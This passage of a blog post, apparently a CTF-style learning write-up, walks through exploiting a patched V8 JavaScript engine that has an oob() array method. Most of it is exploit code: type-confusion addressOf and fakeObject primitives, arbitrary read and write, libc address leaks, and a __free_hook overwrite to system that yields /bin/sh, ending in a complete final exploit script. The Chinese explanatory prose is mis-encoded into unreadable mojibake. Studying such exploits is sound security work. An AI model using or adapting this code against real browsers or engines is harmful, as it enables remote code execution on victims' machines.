<p>var obj_array_map = obj_array.oob();<br>//å°†å¯¹è±¡æ•°ç»„çš„mapèµ‹å€¼ç»™obj_array_map<br>var float_array_map = float_array.oob();<br>//å°†floatçš„mapèµ‹å€¼ç»™obj_array_map</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¿™æ ·æˆ‘ä»¬å°±è·å¾—äº†floatå¯¹è±¡ä¸æŒ‡é’ˆå¯¹è±¡çš„mapåœ°å€ï¼Œå¯ä»¥ç”¨æ¥åšåç»­çš„ç±»å‹æ··æ·†äº†ã€‚  </span><br><span class="line">ç„¶åæˆ‘ä»¬åˆ¶ä½œä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹è±¡çš„å†…å®¹å°±æ˜¯ä¼ªé€ ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„elementã€‚</span><br></pre></td></tr></table></figure>
<p>var fake_array = [<br>    float_array_map, // è¿™é‡Œå¡«å†™ä¹‹å‰oobæ³„éœ²çš„æŸä¸ªfloatæ•°ç»„å¯¹è±¡çš„map<br>    0,<br>    i2f(0x4141414141414141n),<br>    i2f(0x1000000000n),<br>    1.1,<br>    2.2,<br>];</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç„¶åç¼–å†™addressOfå®ç°ï¼Œè¿™é‡Œæœ€é‡è¦çš„æ˜¯åˆ©ç”¨å°†æŒ‡é’ˆå¯¹è±¡çš„mapæ”¹ä¸ºfloatå¯¹è±¡ï¼Œç„¶åå°±å¯ä»¥å¾—åˆ°å¯¹è±¡æŒ‡é’ˆåœ°å€ã€‚</span><br></pre></td></tr></table></figure>

<p>function addressOf(obj_to_leak)<br>{<br>    obj_array[0] = obj_to_leak;  //å°†æŒ‡é’ˆæ”¾å…¥<br>    obj_array.oob(float_array_map); //æ”¹å†™mapä¸ºfloatç±»å‹</p>
<pre><code>let obj_addr = f2i(obj_array[0]) - 1n; //obj_array[0]æ­¤åˆ»ä¸ºdoubleç±»å‹ï¼Œè½¬æ¢å‡ºå¤§intç±»å‹
obj_array.oob(obj_array_map); // è¿˜åŸarrayç±»å‹ä»¥ä¾¿åç»­ç»§ç»­ä½¿ç”¨
return obj_addr;</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ­¤æ—¶æˆ‘ä»¬å‘ç°ï¼Œæˆ‘ä»¬æ³„éœ²å‡ºæ¥çš„æ˜¯floatç±»å‹ï¼Œæˆ‘ä»¬éœ€è¦å¾—åˆ°intç±»å‹ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨å…¬å…±å†…å­˜åŒºåŸŸçš„æ–¹æ³•å®ç°ã€‚    </span><br><span class="line">float64ä¸bigUint64å‚¨å­˜ä¸å…±ä¸€ä¸ªå†…å­˜å—ã€‚æˆ‘ä»¬å¯ä»¥floatå†™å…¥ç„¶åè¿”å›å¯¹äºintä¹Ÿå¯ä»¥intå†™å…¥ç„¶åè¿”å›floatç±»å‹ã€‚</span><br></pre></td></tr></table></figure>
<p>var buf = new ArrayBuffer(16);<br>var float64 = new Float64Array(buf);<br>var bigUint64 = new BigUint64Array(buf);<br>function f2i(f)<br>{<br>    float64[0] = f;<br>    return bigUint64[0];// æµ®ç‚¹æ•°è½¬æ¢ä¸º64ä½æ— ç¬¦å·æ•´æ•°<br>}<br>function i2f(i)<br>{<br>    bigUint64[0] = i;<br>    return float64[0]; // 64ä½æ— ç¬¦å·æ•´æ•°è½¬ä¸ºæµ®ç‚¹æ•°<br>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç„¶åæ³„éœ²ä¸Šé¢æ„é€ çš„`fake_array`çš„åœ°å€</span><br></pre></td></tr></table></figure>
<p>var fake_Array_addr = addressOf(fake_array); // è¿”å›fake_arrayçš„åœ°å€<br>console.log(â€œfake_Array_addr = 0xâ€,fake_Array_addr.toString(16)); //æ‰“å°fake_Array_addr<br>%DebugPrint(fake_array); //æ‰“å°fake_array<br>%SystemBreak();</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è·‘ä¸€ä¸‹</span><br><span class="line">![](V8åˆæ¢/7.jpg)  </span><br><span class="line">è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»æ³„éœ²å‡ºäº†å¯¹è±¡çš„åœ°å€ï¼Œä½†æ˜¯æˆ‘ä»¬è¦æ˜¯æƒ³å®ç°ä»»æ„åœ°å€è¯»å†™ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥ä»ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„é‡Œä¸‹æ‰‹ã€‚</span><br></pre></td></tr></table></figure>
<p>var obj = {â€œaâ€: 1};<br>var obj_array = [obj];</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¦‚ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“obj_arrayçš„ç»“æ„ã€‚  </span><br><span class="line">æˆ‘ä»¬ç”¨ä»¥ä¸‹ä»£ç æ¥æŸ¥çœ‹ã€‚</span><br></pre></td></tr></table></figure>
<p>var obj = {1.1,2.2};<br>var obj_array = [obj];<br>%DebugPrint(obj_array);<br>%SystemBreak();</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å‘ç°elementsæŒ‡å‘çš„ä¹Ÿæ˜¯ä¸ªæŒ‡é’ˆå¯¹è±¡  </span><br><span class="line">![](V8åˆæ¢/8.jpg)  </span><br><span class="line">å¦‚æœæˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªæŒ‡é’ˆå¯¹è±¡çš„tmpä¿®æ”¹ä¸ºfloatç±»å‹ï¼Œç„¶åå°†æˆ‘ä»¬ä¹‹å‰ä¼ªé€ çš„é‚£ä¸ªfakeå¯¹è±¡å†™åˆ°ç¬¬ä¸€ä¸ªå€¼é‡Œï¼Œ`i2f(0x4141414141414141n)`å¯¹åº”çš„æ˜¯elementsçš„ä½ç½®ï¼Œæˆ‘ä»¬å°±å¯ä»¥å®ç°ä»»æ„åœ°å€çš„è¯»å†™äº†ã€‚  </span><br><span class="line">é¦–å…ˆæˆ‘ä»¬è¦è·å¾—è¿™ä¸ªå°†ä¼ªé€ çš„å¯¹è±¡å†™å…¥ã€‚</span><br></pre></td></tr></table></figure>
<p>function fakeObject(addr_to_fake)<br>{<br>    float_array[0] = i2f(addr_to_fake + 1n);<br>    float_array.oob(obj_array_map);  //æ›´æ”¹mapç±»å‹<br>    let faked_obj = float_array[0];  //å°†fakeæŒ‡é’ˆå¯¹è±¡ç»™äº†faked_objï¼Œä¾›éšæ—¶æ›´æ”¹ã€‚<br>    float_array.oob(float_array_map); // è¿˜åŸarrayç±»å‹ä»¥ä¾¿åç»­ç»§ç»­ä½¿ç”¨<br>    return faked_obj;<br>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç„¶åæˆ‘ä»¬éœ€è¦å°†å¾—åˆ°fakeå¯¹è±¡ï¼Œä»¥è¾¹æ›´æ”¹ã€‚</span><br></pre></td></tr></table></figure>
<p>var fake_Array_addr = addressOf(fake_array); // è¿”å›fake_arrayçš„åœ°å€<br>console.log(â€œfake_Array_addr = 0xâ€,fake_Array_addr.toString(16));<br>var faked_object = fakeObject(fake_Array_addr - 0x30n);</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œè¦ä¼ `fake_Array_addr - 0x30n`æ˜¯å› ä¸ºè¿™é‡Œæ˜¯æˆ‘ä»¬ä¼ªé€ çš„ç»“æ„ä½“ã€‚å¦‚ä¸‹å›¾     </span><br><span class="line">![](V8åˆæ¢/9.jpg)  </span><br><span class="line"></span><br><span class="line">ç„¶åéœ€è¦å†™ä»»æ„åœ°å€è¯»å†™ä»£ç ã€‚</span><br></pre></td></tr></table></figure>
<p>function read64(addr)<br>{<br>    fake_array[2] = i2f(addr - 0x10n + 0x1n);  //ç”±äºelements+0x10-0x1æ˜¯å†™å…¥çš„åœ°æ–¹ï¼Œæˆ‘ä»¬æˆ‘ä»¬è¦å°†ä»£å†™åœ°å€-0x10+0x1ï¼Œå…·ä½“è§å›¾1<br>    let read_data = f2i(faked_object[0]);  //è¯»å‡ºä½ ä¼ªé€ çš„ç¬¬ä¸€ä¸ªåœ°å€çš„å€¼<br>    console.log(â€œ[*] read from: 0xâ€ + addr.toString(16) + â€œ: 0xâ€ + read_data.toString(16));<br>    return read_data;<br>}</p>
<p>function Write64(addr,num)<br>{<br>    fake_array[2] = i2f(addr - 0x10n + 0x1n); //åŒç†<br>    faked_object[0] = i2f(num);  //å°†æŒ‡å®šåœ°å€å€¼èµ‹äºˆnumï¼›<br>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">å›¾1:</span><br><span class="line">![](V8åˆæ¢/10.jpg)  </span><br><span class="line">æ•…æ­¤ï¼Œæˆ‘ä»¬æˆåŠŸå®ç°äº†ä»»æ„åœ°å€è¯»ä¸ä»»æ„åœ°å€å†™ã€‚  </span><br><span class="line">å¸¸è§„pwnæ€è·¯åˆ°æ­¤ï¼Œæˆ‘ä»¬åº”è¯¥å»æ³„éœ²åœ°å€ï¼Œç„¶åæ”¹hookæŒ‡é’ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥æ€ä¹ˆå»æ³„éœ²åœ°å€å‘¢ã€‚  </span><br><span class="line">æˆ‘ä»¬ç»§ç»­è°ƒè¯•  </span><br><span class="line">![](V8åˆæ¢/11.jpg)  </span><br><span class="line">é¦–å…ˆè¿›å…¥mapå¯¹è±¡  </span><br><span class="line">![](V8åˆæ¢/12.jpg)   </span><br><span class="line">ç„¶åè¿›å…¥constructorå¯¹è±¡ã€‚  </span><br><span class="line">![](V8åˆæ¢/13.jpg)  </span><br><span class="line">å‘ç°codeå¯¹è±¡ã€‚  </span><br><span class="line">![](V8åˆæ¢/14.jpg)  </span><br><span class="line">å‘ç°å…¶ä¸­æŒ‡å‘ä¸€ä¸ªç¨‹åºåœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹è¿™ä¸ªæ¥æ³„éœ²ç¨‹åºåœ°å€ã€‚  </span><br><span class="line">ç„¶åæ³„éœ²goté‡Œé¢çš„libcåœ°å€ï¼Œå¾—åˆ°libcåœ°å€ã€‚  </span><br><span class="line">å…·ä½“ä»£ç ä¸º</span><br></pre></td></tr></table></figure>
<p>var float_map_addr = read64(fake_Array_addr);<br>var constructor_addr = read64(float_map_addr + 0x114fn);<br>var code_addr = read64(constructor_addr + 0x2fn);<br>var textbase_addr = read64(code_addr + 0x41n)-0xf91780n;<br>var libcbase_addr = read64(textbase_addr + 0x12737b0n) - 0x3a2e0n;<br>console.log(â€œ[<em>] textbase_addr from: 0xâ€ + textbase_addr.toString(16));<br>console.log(â€œ[</em>] libcbase_addr from: 0xâ€ + libcbase_addr.toString(16));<br>var free_hook = libcbase_addr + 0x3c67a8n;<br>var one = [0x45226n,0x4527an,0xf0364n,0xf1207n]<br>var one_gadget = libcbase_addr +0x453a0n   //  0x453a0n; system</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">æœ€åï¼Œæˆ‘é€‰æ‹©çš„æ˜¯æ›´æ”¹free_hook ä¸ºsystemçš„åœ°å€ï¼Œç„¶åshellã€‚  </span><br><span class="line">è¿™é‡Œone_gadgetä»£è¡¨çš„æ˜¯systemå‡½æ•°åœ°å€ã€‚  </span><br><span class="line">æœ¬åœ°libcç‰ˆæœ¬:`Ubuntu GLIBC 2.23-0ubuntu11.2`   </span><br><span class="line">ç„¶åå°±ç®€å•äº†ï¼Œå°±æ˜¯æ”¹free_hookå°±å¯ä»¥äº†ã€‚  </span><br><span class="line">è¿™é‡Œæˆ‘ä»¬å‘ç°write64å‡½æ•°å®ç°çš„æœ‰é—®é¢˜ï¼Œç»è¿‡æŸ¥è¯¢å¾—å‡º:`ç›´æ¥ç”¨FloatArrayæ–¹å¼å‘é«˜åœ°å€å†™å…¥ä¼šä¸æˆåŠŸã€‚`  </span><br><span class="line">ç„¶åå°±ç”¨æ–°åŠæ³•ã€‚ä½¿ç”¨DataViewæ–¹æ³•å†™å…¥ã€‚</span><br></pre></td></tr></table></figure>
<p>var data_buf = new ArrayBuffer(8);<br>var data_view = new DataView(data_buf);<br>var buf_backing_store_addr = addressOf(data_buf) + 0x20n;</p>
<p>function write64_dataview(addr, data)<br>{<br>    Write64(buf_backing_store_addr, addr);<br>    data_view.setFloat64(0, i2f(data), true);<br>    console.log(â€œ/bin/sh &amp;&amp; exit â€œ);  //è¿™é‡Œæˆ‘å‘ç°freeçš„æ—¶å€™ä¼šfreeå‚æ•°æŒ‡é’ˆã€‚æ‰€ä»¥è¿™é‡Œçš„å‚æ•°ç›´æ¥å†™æˆå‘½ä»¤å³å¯ã€‚<br>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç„¶åå°±ç®€å•äº†ã€‚</span><br></pre></td></tr></table></figure>
<p>write64_dataview(free_hook,one_gadget);   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![](V8åˆæ¢/15.jpg)  </span><br><span class="line">æœ€åçš„exp ï¼š</span><br></pre></td></tr></table></figure>
<p>var obj = {â€œaâ€: 1};<br>var obj_array = [obj];</p>
<p>var float_array = [1.1,2.2];</p>
<p>var buf = new ArrayBuffer(16);<br>var float64 = new Float64Array(buf);<br>var bigUint64 = new BigUint64Array(buf);</p>
<p>var obj_array_map = obj_array.oob();<br>//å°†å¯¹è±¡æ•°ç»„çš„mapèµ‹å€¼ç»™obj_array_map<br>var float_array_map = float_array.oob();<br>//å°†floatçš„mapèµ‹å€¼ç»™obj_array_map</p>
<p>function f2i(f)<br>{<br>    float64[0] = f;<br>    return bigUint64[0];// æµ®ç‚¹æ•°è½¬æ¢ä¸º64ä½æ— ç¬¦å·æ•´æ•°<br>}</p>
<p>function i2f(i)<br>{<br>    bigUint64[0] = i;<br>    return float64[0]; // 64ä½æ— ç¬¦å·æ•´æ•°è½¬ä¸ºæµ®ç‚¹æ•°<br>}</p>
<p>function addressOf(obj_to_leak)<br>{<br>    obj_array[0] = obj_to_leak;<br>    obj_array.oob(float_array_map);</p>
<pre><code>let obj_addr = f2i(obj_array[0]) - 1n; //obj_array[0]æ­¤åˆ»ä¸ºdoubleç±»å‹ï¼Œè½¬æ¢å‡ºå¤§intç±»å‹
obj_array.oob(obj_array_map); // è¿˜åŸarrayç±»å‹ä»¥ä¾¿åç»­ç»§ç»­ä½¿ç”¨
return obj_addr;</code></pre><p>}</p>
<p>function fakeObject(addr_to_fake)<br>{<br>    float_array[0] = i2f(addr_to_fake + 1n);<br>    float_array.oob(obj_array_map);<br>    // float_array[0]=[i2f(0x1234n),i2f(0x2345n)];<br>    let faked_obj = float_array[0];<br>    float_array.oob(float_array_map); // è¿˜åŸarrayç±»å‹ä»¥ä¾¿åç»­ç»§ç»­ä½¿ç”¨</p>
<pre><code>return faked_obj;</code></pre><p>}</p>
<p>var fake_array = [<br>    float_array_map, // è¿™é‡Œå¡«å†™ä¹‹å‰oobæ³„éœ²çš„æŸä¸ªfloatæ•°ç»„å¯¹è±¡çš„map<br>    0,<br>    i2f(0x4141414141414141n),<br>    i2f(0x1000000000n),<br>    1.1,<br>    2.2,<br>];</p>
<p>var fake_Array_addr = addressOf(fake_array); // è¿”å›fake_arrayçš„åœ°å€<br>console.log(â€œfake_Array_addr = 0xâ€,fake_Array_addr.toString(16));<br>var faked_object = fakeObject(fake_Array_addr - 0x30n);</p>
<p>function read64(addr)<br>{<br>    fake_array[2] = i2f(addr - 0x10n + 0x1n);<br>    let read_data = f2i(faked_object[0]);<br>    console.log(â€œ[*] read from: 0xâ€ + addr.toString(16) + â€œ: 0xâ€ + read_data.toString(16));<br>    return read_data;<br>}<br>function Write64(addr,num)<br>{<br>    fake_array[2] = i2f(addr - 0x10n + 0x1n);<br>    faked_object[0] = i2f(num);<br>}</p>
<p>var data_buf = new ArrayBuffer(8);<br>var data_view = new DataView(data_buf);<br>var buf_backing_store_addr = addressOf(data_buf) + 0x20n;</p>
<p>function write64_dataview(addr, data)<br>{<br>    Write64(buf_backing_store_addr, addr);<br>    data_view.setFloat64(0, i2f(data), true);<br>    console.log(â€œ/bin/sh &amp;&amp; exit â€œ);<br>}</p>
<p>var float_map_addr = read64(fake_Array_addr);<br>var constructor_addr = read64(float_map_addr + 0x114fn);<br>var code_addr = read64(constructor_addr + 0x2fn);<br>var textbase_addr = read64(code_addr + 0x41n)-0xf91780n;<br>var libcbase_addr = read64(textbase_addr + 0x12737b0n) - 0x3a2e0n;<br>console.log(â€œ[<em>] textbase_addr from: 0xâ€ + textbase_addr.toString(16));<br>console.log(â€œ[</em>] libcbase_addr from: 0xâ€ + libcbase_addr.toString(16));<br>var free_hook = libcbase_addr + 0x3c67a8n;<br>var one = [0x45226n,0x4527an,0xf0364n,0xf1207n]<br>var one_gadget = libcbase_addr +0x453a0n   //  0x453a0n; system<br>console.log(â€œ[<em>] free_hook from: 0xâ€ + free_hook.toString(16));<br>console.log(â€œ[</em>] one_gadget from: 0xâ€ + one_gadget.toString(16));</p>
<p>write64_dataview(free_hook,one_gadget); </p>
<pre><code>### æ€»ç»“  
é¦–å…ˆï¼Œåˆå­¦v8ï¼Œå¾ˆå¤šåœ°æ–¹éƒ½æ˜¯åœ¨å¤ç°çš„æ—¶å€™è‡ªå·±æ€è€ƒçš„ï¼Œå¯èƒ½ä¸æ­£ç¡®çš„è§£é‡Šå¤§ç›¸å¾„åº­ï¼Œå¸Œæœ›è€å“¥ä»¬å‘ç°é”™è¯¯äº†å¯ä»¥è¡¥å……è¯´æ˜ã€‚ 
ç„¶åå°±æ˜¯è‡ªå·±çš„æ¬ ç¼ºï¼Œç”±äºè‡ªå·±jsæ°´å¹³çš„æ‹‰å®ç¨‹åº¦ï¼Œå¯¼è‡´è‡ªå·±å¾ˆå¤šæ—¶å€™éƒ½çŸ¥é“é—®é¢˜æ‰€åœ¨äº†ï¼Œä½†å°±æ˜¯å†™ä¸å‡ºè§£å†³çš„è„šæœ¬ï¼Œjsè¿˜æ˜¯éœ€è¦æ¶è¡¥ã€‚  
æœ€åå¸Œæœ›å’Œå„ä½è€å“¥ä»¬ä¸€èµ·å­¦ä¹ ï¼Œå¿«ä¹å‡»å‰‘ğŸ¤ºã€‚  

### å‚è€ƒé“¾æ¥  

https://zhuanlan.zhihu.com/p/106090872?utm_source=qzone
https://www.anquanke.com/post/id/207483#h3-5
https://www.freebuf.com/vuls/203721.html




</code></pre></div><div class="tags"><a href="/tags/Chrome/">Chrome</a></div><div class="post-nav"><a class="next" href="/2020/11/15/2020%E4%B8%8A%E6%B5%B7%E9%82%80%E8%AF%B7%E8%B5%9B%E5%88%9D%E8%B5%9BPWNWN-wp/">2020ä¸Šæµ·é‚€è¯·èµ›åˆèµ›PWN-wp</a></div><div id="vcomment"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script><script>var notify = 'false' ? true : false;
var verify = 'false' ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'AXNWQSAnzhoRuAsbsdqT84uQ-gzGzoHsz',
  appKey:'EcvRS3Hc6zidBU6GIBE3xBJN',
  placeholder:'Just so so',
  avatar:'mm',
  guest_info:guest_info,
  pageSize:'10'
})</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/Writeup/" style="font-size: 15px;">Writeup</a> <a href="/tags/%E6%80%BB%E7%BB%93/" style="font-size: 15px;">æ€»ç»“</a> <a href="/tags/Kernel/" style="font-size: 15px;">Kernel</a> <a href="/tags/%E5%A0%86/" style="font-size: 15px;">å †</a> <a href="/tags/MSF/" style="font-size: 15px;">MSF</a> <a href="/tags/WINPWN/" style="font-size: 15px;">WINPWN</a> <a href="/tags/Chrome/" style="font-size: 15px;">Chrome</a> <a href="/tags/arm/" style="font-size: 15px;">arm</a> <a href="/tags/angr/" style="font-size: 15px;">angr</a> <a href="/tags/%E6%A0%88/" style="font-size: 15px;">æ ˆ</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size: 15px;">æ ¼å¼åŒ–å­—ç¬¦ä¸²</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/12/16/V8%E5%88%9D%E6%8E%A2/">V8åˆæ¢</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/15/2020%E4%B8%8A%E6%B5%B7%E9%82%80%E8%AF%B7%E8%B5%9B%E5%88%9D%E8%B5%9BPWNWN-wp/">2020ä¸Šæµ·é‚€è¯·èµ›åˆèµ›PWN-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/02/2020%E6%B9%96%E6%B9%98%E6%9D%AFPWN%E9%83%A8%E5%88%86W/">2020æ¹–æ¹˜æ¯PWNéƒ¨åˆ†WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/14/MSF%E5%85%8D%E6%9D%80%F0%9F%90%8E%E5%88%B6%E4%BD%9C/">MSFå…æ€ğŸ</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/09/%E6%9F%90%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86pwn/">æŸæ¹–è®ºå‰‘éƒ¨åˆ†pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/05/WIWINPWN%E6%A0%88%E6%BA%A2%E5%87%BA/">åå­—å«å•¥</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/03/2020WMCTFTF-cfgo-CheckIn/">2020WMCTF_cfgo_CheckIn</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/25/DASCTF-7%E6%9C%88pwn/">DASCTF 7æœˆéƒ¨åˆ†pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/01/%E6%9F%90%E5%A0%86%E5%A4%8D%E7%8E%B0-getchar%E5%BC%95%E5%8F%91malloc/">æŸå †å¤ç°(getcharå¼•å‘malloc)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/22/angr%E5%88%9D%E6%8E%A2/">angråˆæ¢</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="https://whali3n51.github.io/" title="whali3n51" target="_blank">whali3n51</a><ul></ul><a href="http://www.pdsdt.lovepdsdt.com/" title="Pdsdt" target="_blank">Pdsdt</a><ul></ul><a href="http://www.dongzt.cn/" title="Alkaid" target="_blank">Alkaid</a><ul></ul><a href="http://w4nder.top/" title="W4nder" target="_blank">W4nder</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright Â© 2020 <a href="/." rel="nofollow">starssgo.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/search.js?v=0.0.0"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
   search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>